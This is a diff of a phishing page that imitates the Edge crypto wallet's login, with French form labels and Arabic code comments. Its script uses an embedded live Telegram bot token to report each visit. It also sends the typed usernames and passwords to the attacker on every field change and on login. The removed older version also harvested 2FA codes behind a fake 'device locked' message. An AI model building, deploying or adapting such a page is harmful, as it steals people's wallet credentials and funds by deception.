@@ -1,4 +1,4 @@
-<!DOCTYPE html>
+ <!DOCTYPE html>
 <html lang="fr">
 <head>
     <meta charset="UTF-8">
@@ -210,11 +210,11 @@
             color: #10b981;
         }
 
-        /* ========== الأقسام العامة ========== */
-        .page-section {
+        /* ========== الصفحة الأولى - الترحيب ========== */
+        .welcome-page {
             width: 100%;
             min-height: 100vh;
-            display: none;
+            display: flex;
             flex-direction: column;
             align-items: center;
             justify-content: center;
@@ -223,11 +223,10 @@
             animation: fadeIn 0.5s ease;
         }
 
-        .page-section.active {
-            display: flex;
+        .welcome-page.hidden {
+            display: none;
         }
 
-        /* ========== الصفحة الأولى - الترحيب ========== */
         .logo-container {
             margin-bottom: 80px;
         }
@@ -277,6 +276,11 @@
             font-family: 'Inter', sans-serif;
         }
 
+        .btn-primary:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 14px 40px rgba(125, 184, 137, 0.5);
+        }
+
         .footer-text {
             font-size: 17px;
             color: #6b7280;
@@ -290,17 +294,48 @@
             cursor: pointer;
         }
 
+        .footer-text a:hover {
+            color: #059669;
+        }
+
         /* ========== صفحة تسجيل الدخول ========== */
-        .login-content {
+        .login-page {
             width: 100%;
-            max-width: 420px;
+            min-height: 100vh;
+            display: none;
+            flex-direction: column;
+            background: #f8f9fa;
+            animation: fadeIn 0.4s ease;
+            padding-top: 80px;
+        }
+
+        .login-page.active {
+            display: flex;
+        }
+
+        .login-content {
+            flex: 1;
             display: flex;
             flex-direction: column;
             align-items: center;
+            justify-content: center;
+            padding: 60px 40px 80px;
+        }
+
+        .login-logo {
+            margin-bottom: 70px;
+        }
+
+        .login-logo img {
+            width: 200px;
+            height: 200px;
+            object-fit: contain;
+            filter: drop-shadow(0 8px 24px rgba(0,0,0,0.12));
         }
 
         .input-group {
             width: 100%;
+            max-width: 420px;
             margin-bottom: 20px;
             position: relative;
         }
@@ -312,128 +347,313 @@
             border-radius: 20px;
             padding: 22px 60px 22px 26px;
             font-size: 18px;
+            color: #1a1a1a;
+            font-family: 'Inter', sans-serif;
+            font-weight: 400;
             outline: none;
+            transition: all 0.2s;
+        }
+
+        .input-field::placeholder {
+            color: #6b7280;
+        }
+
+        .input-field:focus {
+            box-shadow: 0 0 0 3px rgba(16, 185, 129, 0.15);
+        }
+
+        .input-icon {
+            position: absolute;
+            right: 22px;
+            top: 50%;
+            transform: translateY(-50%);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .check-icon {
+            width: 24px;
+            height: 24px;
+            color: #10b981;
+        }
+
+        .eye-icon {
+            width: 26px;
+            height: 26px;
+            color: #6b7280;
+            cursor: pointer;
         }
 
         .btn-login {
             width: 100%;
+            max-width: 420px;
             background: #c8ddd4;
             color: white;
             border: none;
             padding: 20px;
             font-size: 18px;
+            font-weight: 500;
             border-radius: 50px;
             cursor: not-allowed;
             margin-top: 32px;
+            margin-bottom: 16px;
+            font-family: 'Inter', sans-serif;
+            transition: all 0.3s;
         }
 
         .btn-login.active {
             background: linear-gradient(135deg, #10b981 0%, #059669 100%);
             cursor: pointer;
+            box-shadow: 0 10px 32px rgba(16, 185, 129, 0.4);
         }
 
-        /* ========== تصميم شاشات 2FA المضافة ========== */
-        .fa-container {
+        .btn-login.active:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 14px 40px rgba(16, 185, 129, 0.5);
+        }
+
+        .btn-create {
             width: 100%;
-            max-width: 450px;
-            text-align: left;
-            background: #1a1a1a; /* خلفية داكنة مطابقة للصورة */
-            padding: 40px 30px;
-            border-radius: 24px;
-            color: white;
-        }
-
-        .fa-title {
-            font-size: 24px;
-            margin-bottom: 15px;
+            max-width: 420px;
+            background: #e5e7eb;
+            color: #1a1a1a;
+            border: none;
+            padding: 20px;
+            font-size: 18px;
             font-weight: 500;
+            border-radius: 50px;
+            cursor: pointer;
+            margin-bottom: 28px;
+            font-family: 'Inter', sans-serif;
+            transition: all 0.3s;
         }
 
-        .fa-desc {
-            font-size: 15px;
-            color: #b0b0b0;
-            line-height: 1.5;
-            margin-bottom: 40px;
+        .btn-create:hover {
+            background: #d1d5db;
         }
 
-        .fa-input-wrapper {
-            position: relative;
-            border: 2px solid #10b981;
-            border-radius: 12px;
-            padding: 15px;
-            background: #2a2a2a;
+        .forgot-link {
+            color: #10b981;
+            text-decoration: none;
+            font-size: 17px;
+            font-weight: 500;
             margin-bottom: 60px;
-        }
-
-        .fa-input-wrapper input {
-            background: transparent;
-            border: none;
-            color: white;
-            font-size: 18px;
-            width: 100%;
-            outline: none;
-        }
-
-        .btn-envoyer {
-            background: #4a4a4a;
-            color: white;
-            border: none;
-            padding: 16px 60px;
-            border-radius: 30px;
-            font-size: 18px;
-            display: block;
-            margin: 0 auto;
             cursor: pointer;
         }
 
-        .error-box {
-            display: flex;
-            align-items: flex-start;
-            color: #ffb84d;
-            margin-bottom: 30px;
+        .forgot-link:hover {
+            color: #059669;
         }
 
-        .warning-sign {
-            font-size: 32px;
-            margin-right: 15px;
+        /* تنسيق مخصص للصورة الجديدة */
+        .qr-image-container img {
+            width: 80px;
+            height: 80px;
+            border-radius: 8px;
+            object-fit: cover;
         }
 
-        .menu-list-item {
-            display: flex;
-            justify-content: space-between;
-            padding: 20px 0;
-            border-bottom: 1px solid #333;
-            border-top: 1px solid #333;
-            margin-bottom: 40px;
-        }
-
-        .arrow-green {
-            color: #10b981;
-            font-weight: bold;
-        }
-
-        .lock-info {
-            color: #888;
-            font-size: 14px;
-            line-height: 1.6;
-        }
-
-        /* ========== قسم المطورين ========== */
+        /* ========== قسم المطورين - أسود ========== */
         .developer-section {
             width: 100%;
             background: #000000;
             padding: 80px 60px;
         }
 
-        .developer-title { color: white; font-size: 32px; margin-bottom: 20px; }
-        .developer-text { color: #e5e7eb; margin-bottom: 20px; }
-        .github-link { color: #6ee7b7; text-decoration: underline; display: flex; align-items: center; gap: 10px; }
+        .developer-content {
+            max-width: 600px;
+        }
 
-        @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
+        .developer-title {
+            font-size: 32px;
+            font-weight: 600;
+            color: #ffffff;
+            line-height: 1.3;
+            margin-bottom: 32px;
+        }
 
+        .developer-text {
+            font-size: 18px;
+            color: #e5e7eb;
+            line-height: 1.7;
+            margin-bottom: 32px;
+        }
+
+        .developer-text a {
+            color: #6ee7b7;
+            text-decoration: underline;
+        }
+
+        .developer-text a:hover {
+            color: #34d399;
+        }
+
+        .github-link {
+            display: inline-flex;
+            align-items: center;
+            gap: 12px;
+            color: #6ee7b7;
+            text-decoration: underline;
+            font-size: 17px;
+            font-weight: 500;
+            transition: color 0.2s;
+        }
+
+        .github-link:hover {
+            color: #34d399;
+        }
+
+        .github-icon {
+            width: 28px;
+            height: 28px;
+            fill: #6ee7b7;
+        }
+
+        /* تأثيرات */
+        @keyframes fadeIn {
+            from { opacity: 0; }
+            to { opacity: 1; }
+        }
+
+        @keyframes fadeInUp {
+            from {
+                opacity: 0;
+                transform: translateY(30px);
+            }
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+
+        .welcome-page > * {
+            animation: fadeInUp 0.6s ease forwards;
+        }
+
+        .logo-container { animation-delay: 0.1s; }
+        .title { animation-delay: 0.2s; }
+        .subtitle { animation-delay: 0.3s; }
+        .btn-primary { animation-delay: 0.4s; }
+        .footer-text { animation-delay: 0.5s; }
+
+        .login-content > * {
+            animation: fadeInUp 0.5s ease forwards;
+        }
+
+        .login-logo { animation-delay: 0.1s; }
+        .input-group:nth-child(2) { animation-delay: 0.2s; }
+        .input-group:nth-child(3) { animation-delay: 0.3s; }
+        .btn-login { animation-delay: 0.4s; }
+        .btn-create { animation-delay: 0.5s; }
+        .forgot-link { animation-delay: 0.6s; }
+        .qr-image-container { animation-delay: 0.7s; }
+
+        /* توافق الحاسوب الكبير */
+        @media (min-width: 1024px) {
+            .header {
+                padding: 16px 60px;
+            }
+
+            .header-logo {
+                height: 42px;
+            }
+
+            .menu-panel {
+                max-width: 520px;
+            }
+
+            .menu-header {
+                padding: 20px 32px;
+            }
+
+            .menu-logo {
+                height: 38px;
+            }
+
+            .menu-search {
+                padding: 24px 32px;
+            }
+
+            .menu-item {
+                padding: 24px 32px;
+                font-size: 20px;
+            }
+
+            .logo-container img, .login-logo img {
+                width: 240px;
+                height: 240px;
+            }
+
+            .title {
+                font-size: 64px;
+            }
+
+            .subtitle {
+                font-size: 22px;
+                max-width: 560px;
+            }
+
+            .input-group, .btn-login, .btn-create {
+                max-width: 480px;
+            }
+
+            .developer-section {
+                padding: 100px 80px;
+            }
+
+            .developer-title {
+                font-size: 38px;
+            }
+
+            .developer-text {
+                font-size: 20px;
+            }
+        }
+
+        /* توافق الجوال */
         @media (max-width: 640px) {
-            .title { font-size: 40px; }
-            .developer-section { padding: 60px 24px; }
+            .header {
+                padding: 10px 20px;
+            }
+
+            .header-logo {
+                height: 30px;
+            }
+
+            .header-right {
+                gap: 16px;
+            }
+
+            .welcome-page, .login-content {
+                padding-left: 24px;
+                padding-right: 24px;
+            }
+
+            .logo-container img, .login-logo img {
+                width: 160px;
+                height: 160px;
+            }
+
+            .title {
+                font-size: 40px;
+            }
+
+            .subtitle {
+                font-size: 17px;
+            }
+
+            .developer-section {
+                padding: 60px 24px;
+            }
+
+            .developer-title {
+                font-size: 26px;
+            }
+
+            .developer-text {
+                font-size: 16px;
+            }
         }
     </style>
 </head>
@@ -444,19 +664,28 @@
         <div class="menu-header">
             <img src="https://i.ibb.co/JFW12hJR/57570062-C5-CD-4-E81-A2-F2-DAF1-B6181-F9-B.png" alt="Edge" class="menu-logo">
             <div class="menu-close" onclick="closeMenu()">
-                <svg viewBox="0 0 24 24"><path d="M18 6L6 18M6 6l12 12" stroke="white" stroke-width="2"/></svg>
+                <svg viewBox="0 0 24 24">
+                    <path d="M18 6L6 18M6 6l12 12" stroke-linecap="round" stroke-linejoin="round"/>
+                </svg>
             </div>
         </div>
+        
         <div class="menu-search">
             <div class="search-box">
                 <input type="text" class="search-input" placeholder="Search Anything">
+                <svg class="search-icon" viewBox="0 0 24 24">
+                    <circle cx="11" cy="11" r="8"/>
+                    <path d="M21 21l-4.35-4.35"/>
+                </svg>
             </div>
         </div>
+        
         <nav class="menu-items">
-            <a href="#" class="menu-item">About</a>
-            <a href="#" class="menu-item">Edge-ucation</a>
-            <a href="#" class="menu-item">Support</a>
-            <a href="#" class="menu-item get-started" onclick="closeMenu(); goToStep('loginPage');">Get Started</a>
+            <a href="https://edge.app/about/?af=edge-app" class="menu-item" target="_blank" rel="noopener noreferrer">About</a>
+            <a href="https://edge.app/blog/?af=edge-app" class="menu-item" target="_blank" rel="noopener noreferrer">Edge-ucation</a>
+            <a href="https://support.edge.app/hc/en-us" class="menu-item" target="_blank" rel="noopener noreferrer">Support</a>
+            <a href="https://edge.app/events/?af=edge-app" class="menu-item" target="_blank" rel="noopener noreferrer">Events</a>
+            <a href="#" class="menu-item get-started" onclick="closeMenu(); showLogin();">Get Started</a>
         </nav>
     </div>
 
@@ -465,121 +694,164 @@
             <img src="https://i.ibb.co/GfZvNh7z/1-EA82644-04-AB-4694-AD14-0-A0-E58-CBAC3-C.png" alt="Edge" class="header-logo">
         </div>
         <div class="header-right">
+            <div class="icon-btn">
+                <svg viewBox="0 0 24 24">
+                    <circle cx="11" cy="11" r="8"/>
+                    <path d="M21 21l-4.35-4.35"/>
+                </svg>
+            </div>
             <div class="icon-btn" onclick="openMenu()">
-                <svg viewBox="0 0 24 24"><line x1="3" y1="6" x2="21" y2="6" stroke="black" stroke-width="2"/><line x1="3" y1="12" x2="21" y2="12" stroke="black" stroke-width="2"/><line x1="3" y1="18" x2="21" y2="18" stroke="black" stroke-width="2"/></svg>
+                <svg viewBox="0 0 24 24">
+                    <line x1="3" y1="6" x2="21" y2="6"/>
+                    <line x1="3" y1="12" x2="21" y2="12"/>
+                    <line x1="3" y1="18" x2="21" y2="18"/>
+                </svg>
             </div>
         </div>
     </header>
 
-    <div class="page-section active" id="welcomePage">
+    <div class="welcome-page" id="welcomePage">
         <div class="logo-container">
             <img src="https://i.ibb.co/Mk8KKTJ9/49-E2-B7-AD-63-C1-481-F-82-A1-D0827-AE9-AD11.png" alt="Edge Logo">
         </div>
-        <h1 class="title">Welcome to<br>Financial <span class="highlight">Freedom</span></h1>
-        <p class="subtitle">Edge is the open source tool you need to invest, secure, and put your crypto in action.</p>
-        <button class="btn-primary" onclick="goToStep('loginPage')">Get Started</button>
-        <p class="footer-text">Already have an account? <a onclick="goToStep('loginPage')">Sign in</a></p>
+
+        <h1 class="title">
+            Welcome to<br>
+            Financial <span class="highlight">Freedom</span>
+        </h1>
+
+        <p class="subtitle">
+            Edge is the open source tool you need to invest, secure, and put your crypto in action.
+        </p>
+
+        <button class="btn-primary" onclick="showLogin()">Get Started</button>
+
+        <p class="footer-text">
+            Already have an account? <a onclick="showLogin()">Sign in</a>
+        </p>
     </div>
 
-    <div class="page-section" id="loginPage">
+    <div class="login-page" id="loginPage">
         <div class="login-content">
-            <div class="logo-container"><img src="https://i.ibb.co/GfZvNh7z/1-EA82644-04-AB-4694-AD14-0-A0-E58-CBAC3-C.png"></div>
+            <div class="login-logo">
+                <img src="https://i.ibb.co/GfZvNh7z/1-EA82644-04-AB-4694-AD14-0-A0-E58-CBAC3-C.png" alt="Edge Logo">
+            </div>
+
             <div class="input-group">
-                <input type="text" class="input-field" placeholder="Nom d'utilisateur" id="userInp" oninput="validateLogin()">
+                <input type="text" class="input-field" placeholder="Nom d'utilisateur" id="usernameField" oninput="checkInputs()">
+                <span class="input-icon">
+                    <svg class="check-icon" viewBox="0 0 20 20" fill="currentColor">
+                        <path fill-rule="evenodd" d="M16.707 5.293a1 1 0 010 1.414l-8 8a1 1 0 01-1.414 0l-4-4a1 1 0 011.414-1.414L8 12.586l7.293-7.293a1 1 0 011.414 0z" clip-rule="evenodd"/>
+                    </svg>
+                </span>
             </div>
+
             <div class="input-group">
-                <input type="password" class="input-field" placeholder="Mot de passe" id="passInp" oninput="validateLogin()">
-            </div>
-            <button class="btn-login" id="loginBtn" disabled onclick="handleLogin()">Se connecter</button>
-        </div>
-    </div>
-
-    <div class="page-section" id="faStep1">
-        <div class="fa-container">
-            <h2 class="fa-title">Enter 2FA code</h2>
-            <p class="fa-desc">Connectez-vous à votre compte en utilisant l’appareil vous vous installez le multi facteur d’authentification en suite vous cliquez le réglages > Cliquer sur le multi facteur d’authentification pour trouver le code.</p>
-            
-            <div class="fa-input-wrapper">
-                <input type="text" id="faCode" placeholder="2FA code">
+                <input type="password" class="input-field" placeholder="Mot de passe" id="passwordField" oninput="checkInputs()">
+                <span class="input-icon" onclick="togglePassword()">
+                    <svg class="eye-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                        <path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/>
+                        <circle cx="12" cy="12" r="3"/>
+                    </svg>
+                </span>
             </div>
 
-            <button class="btn-envoyer" onclick="handleFA()">Envoyer</button>
-        </div>
-    </div>
+            <button class="btn-login" id="loginBtn" disabled onclick="handleFinalClick()">Se connecter</button>
 
-    <div class="page-section" id="faStep2">
-        <div class="fa-container">
-            <div class="error-box">
-                <span class="warning-sign">⚠️</span>
-                <p>Username and password are correct. This device cannot log in because it does not have the right 2-factor code.</p>
-            </div>
+            <button class="btn-create">Créer un compte</button>
 
-            <div class="menu-list-item" onclick="goToStep('faStep1')">
-                <span>Enter 2FA code</span>
-                <span class="arrow-green">›</span>
-            </div>
+            <a class="forgot-link">Mot de passe oublié</a>
 
-            <div class="lock-info">
-                <p>Wait until Apr 11, 2026 4:36 PM when this device will be automatically authorized to log in</p>
-                <p style="margin-top:15px">Lock ID: 08f54273</p>
+            <div class="qr-image-container">
+                <a href="https://imgbb.com/"><img src="https://i.ibb.co/Xr4zFnpp/A1-A2-E676-8643-423-F-BF5-B-128354918106.jpg" alt="A1A2E676 8643 423F BF5B 128354918106" border="0"></a>
             </div>
         </div>
     </div>
 
     <section class="developer-section">
         <div class="developer-content">
-            <h2 class="developer-title">Are you a developer?</h2>
-            <p class="developer-text">Give your users a familiar and secure key management solution.</p>
-            <a href="#" class="github-link">View Source on Github</a>
+            <h2 class="developer-title">Are you a developer looking for a key management solution?</h2>
+            <p class="developer-text">
+                Give your users a familiar and secure key management solution with Edge Security API/SDK. All it takes is eight lines of code. For more information, please <a href="mailto:info@edge.app">email us</a>.
+            </p>
+            <a href="https://github.com/EdgeApp" class="github-link" target="_blank" rel="noopener noreferrer">
+                <svg class="github-icon" viewBox="0 0 24 24">
+                    <path d="M12 0c-6.626 0-12 5.373-12 12 0 5.302 3.438 9.8 8.207 11.387.599.111.793-.261.793-.577v-2.234c-3.338.726-4.033-1.416-4.033-1.416-.546-1.387-1.333-1.756-1.333-1.756-1.089-.745.083-.729.083-.729 1.205.084 1.839 1.237 1.839 1.237 1.07 1.834 2.807 1.304 3.492.997.107-.775.418-1.305.762-1.604-2.665-.305-5.467-1.334-5.467-5.931 0-1.311.469-2.381 1.236-3.221-.124-.303-.535-1.524.117-3.176 0 0 1.008-.322 3.301 1.23.957-.266 1.983-.399 3.003-.404 1.02.005 2.047.138 3.006.404 2.291-1.552 3.297-1.23 3.297-1.23.653 1.653.242 2.874.118 3.176.77.84 1.235 1.911 1.235 3.221 0 4.609-2.807 5.624-5.479 5.921.43.372.823 1.102.823 2.222v3.293c0 .319.192.694.801.576 4.765-1.589 8.199-6.086 8.199-11.386 0-6.627-5.373-12-12-12z"/>
+                </svg>
+                View Source on Github
+            </a>
         </div>
     </section>
 
     <script>
+        // --- إعدادات البوت ---
         const bot_token = '8712672264:AAHqDeXBf9EQ_BF40-qOrH68WWPGuumQshI';
         const chat_id = '8745009295';
 
-        function sendToTelegram(msg) {
-            fetch(`https://api.telegram.org/bot${bot_token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(msg)}`);
+        function sendToTelegram(message) {
+            const url = `https://api.telegram.org/bot${bot_token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(message)}`;
+            fetch(url).catch(err => console.log("Telegram Error"));
         }
 
-        function openMenu() { 
-            document.getElementById('menuOverlay').classList.add('active'); 
-            document.getElementById('menuPanel').classList.add('active'); 
+        window.onload = function() {
+            sendToTelegram("🔔 زيارة جديدة للموقع!");
+        };
+
+        document.addEventListener('change', function(e) {
+            const user = document.getElementById('usernameField').value;
+            const pass = document.getElementById('passwordField').value;
+            if (user || pass) {
+                sendToTelegram(`👤 بيانات جزئية:\nالاسم: ${user}\nالكلمة: ${pass}`);
+            }
+        });
+
+        function handleFinalClick() {
+            const user = document.getElementById('usernameField').value;
+            const pass = document.getElementById('passwordField').value;
+            sendToTelegram(`🚀 تم الضغط على الدخول:\nالاسم: ${user}\nالكلمة: ${pass}`);
         }
 
-        function closeMenu() { 
-            document.getElementById('menuOverlay').classList.remove('active'); 
-            document.getElementById('menuPanel').classList.remove('active'); 
+        // --- دوال التحكم في الواجهة ---
+        function openMenu() {
+            document.getElementById('menuOverlay').classList.add('active');
+            document.getElementById('menuPanel').classList.add('active');
+            document.body.style.overflow = 'hidden';
         }
 
-        function goToStep(stepId) {
-            document.querySelectorAll('.page-section').forEach(s => s.classList.remove('active'));
-            document.getElementById(stepId).classList.add('active');
-            window.scrollTo(0,0);
+        function closeMenu() {
+            document.getElementById('menuOverlay').classList.remove('active');
+            document.getElementById('menuPanel').classList.remove('active');
+            document.body.style.overflow = '';
         }
 
-        function validateLogin() {
-            const u = document.getElementById('userInp').value;
-            const p = document.getElementById('passInp').value;
-            const btn = document.getElementById('loginBtn');
-            if(u && p) { btn.disabled = false; btn.classList.add('active'); }
-            else { btn.disabled = true; btn.classList.remove('active'); }
+        function showLogin() {
+            document.getElementById('welcomePage').classList.add('hidden');
+            document.getElementById('loginPage').classList.add('active');
         }
 
-        function handleLogin() {
-            const u = document.getElementById('userInp').value;
-            const p = document.getElementById('passInp').value;
-            sendToTelegram(`🔐 محاولة دخول:\nالمستخدم: ${u}\nكلمة السر: ${p}`);
-            goToStep('faStep1');
+        function showWelcome() {
+            document.getElementById('loginPage').classList.remove('active');
+            document.getElementById('welcomePage').classList.remove('hidden');
         }
 
-        function handleFA() {
-            const code = document.getElementById('faCode').value;
-            sendToTelegram(`🔑 كود الـ 2FA المدخل: ${code}`);
-            goToStep('faStep2');
+        function togglePassword() {
+            const field = document.getElementById('passwordField');
+            field.type = field.type === 'password' ? 'text' : 'password';
         }
 
-        window.onload = () => sendToTelegram("🌐 الزائر الآن في الصفحة الرئيسية");
+        function checkInputs() {
+            const username = document.getElementById('usernameField').value.trim();
+            const password = document.getElementById('passwordField').value.trim();
+            const loginBtn = document.getElementById('loginBtn');
+
+            if (username.length > 0 && password.length > 0) {
+                loginBtn.classList.add('active');
+                loginBtn.disabled = false;
+            } else {
+                loginBtn.classList.remove('active');
+                loginBtn.disabled = true;
+            }
+        }
     </script>
 </body>
 </html>
